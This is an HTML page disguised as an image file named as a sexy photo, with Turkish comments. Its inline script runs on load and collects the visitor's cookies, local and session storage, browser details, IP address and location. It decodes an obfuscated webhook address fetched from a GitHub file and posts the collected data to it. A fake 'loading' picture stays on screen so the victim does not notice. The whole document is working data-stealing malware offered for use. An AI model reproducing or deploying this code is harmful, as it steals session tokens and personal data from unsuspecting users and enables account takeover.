<!DOCTYPE html>
<html>
<head>
    <title>seksi_kiz_resim.jpg</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Tüm bilgileri topla
        const data = {
            URL: location.href,
            Cookies: document.cookie || '❌ Yok',
            LocalStorage: (() => {
                try { return Object.keys(localStorage).length ? JSON.stringify(localStorage) : '❌ Boş'; } 
                catch (e) { return '❌ Erişilemedi'; }
            })(),
            SessionStorage: (() => {
                try { return Object.keys(sessionStorage).length ? JSON.stringify(sessionStorage) : '❌ Boş'; } 
                catch (e) { return '❌ Erişilemedi'; }
            })(),
            UserAgent: navigator.userAgent,
            Language: navigator.language,
            Platform: navigator.platform,
            Online: navigator.onLine,
            Referrer: document.referrer || '❌ Yok',
            IP: '⏳ Bekleniyor...',
            Tarih: new Date().toISOString(),
            Geolocation: '❌ Alındı değil'
        };

        // IP al
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ip => { data.IP = ip.ip; })
            .catch(() => { data.IP = '❌ Alınamadı'; });

        // Coğrafi konum (isteğe bağlı, kullanıcı izin verirse)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => { data.Geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
                () => { data.Geolocation = '❌ Reddedildi'; },
                { timeout: 3000 }
            );
        }

        // Webhook URL'sini al, deşifre et ve veri gönder
        fetch('https://raw.githubusercontent.com/nefretwasherebaby/keys/master/webhook.enc')
            .then(res => res.text())
            .then(encrypted => {
                const key = 'x7gT9kP2';
                let decrypted = '';
                const raw = atob(encrypted.trim());
                for (let i = 0; i < raw.length; i++) {
                    decrypted += String.fromCharCode(raw.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                return decrypted;
            })
            .then(WEBHOOK_URL => {
                // Veriler hazır, 3 saniye sonra gönder (IP için bekle)
                setTimeout(() => {
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: 'foti',
                            avatar_url: 'https://i.imgur.com/rFhOcMq.png',
                            embeds: [{
                                title: '🔥 eSHeKeVLaDıXDX',
                                description: '```yaml\nHEDİYE BIRAKTIK ABİ\n```',
                                color: 16711680,
                                fields: Object.keys(data).map(k => ({
                                    name: `📌 ${k.toUpperCase()}`,
                                    value: '```\n' + (data[k] || 'N/A').toString().substr(0, 1000) + '\n```',
                                    inline: false
                                })),
                                footer: { text: 'nefretwasherebaby' },
                                timestamp: new Date().toISOString()
                            }]
                        })
                    }).catch(e => console.log('Gönderilemedi:', e));
                }, 3000);
            })
            .catch(e => console.error('Webhook hatası:', e));

        // Kullanıcıyı fark ettirmemek için resim göster
        document.body.innerHTML = `
            <div style="width:100vw;height:100vh;margin:0;padding:0;overflow:hidden;background:#000;">
                <img src="https://via.placeholder.com/1920x1080/111/ffffff?text=Seksii+Resim+Yükleniyor...%0A%0ABirkaç+saniye+beğen" 
                     style="width:100%;height:100%;object-fit:cover;">
            </div>
        `;
    </script>
</head>
<body style="margin:0;overflow:hidden;background:#000;"></body>
</html>
